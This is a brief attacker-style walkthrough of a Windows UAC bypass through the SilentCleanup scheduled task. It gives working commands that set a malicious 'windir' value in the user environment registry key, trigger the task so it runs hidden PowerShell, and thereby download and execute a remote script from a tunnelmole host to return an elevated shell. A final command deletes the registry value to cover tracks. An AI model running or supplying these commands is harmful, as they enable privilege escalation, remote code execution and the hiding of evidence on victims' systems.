Add our malicous commands in environmental registry hive:
reg add "HKCU\Environment" /v "windir" /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <https://8bqmcm-ip-192-42-116-216.tunnelmole.net/test.ps1)> " /f

Force the service to start and trigger it's corresponding attributes:
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

With our listener active before the last command, we will give yet our shell as a high integrity session given sufficient real time prevention is not sufficiently in place.

Clearing our tracks:
reg delete "HKCU\Environment" /v "windir" /f

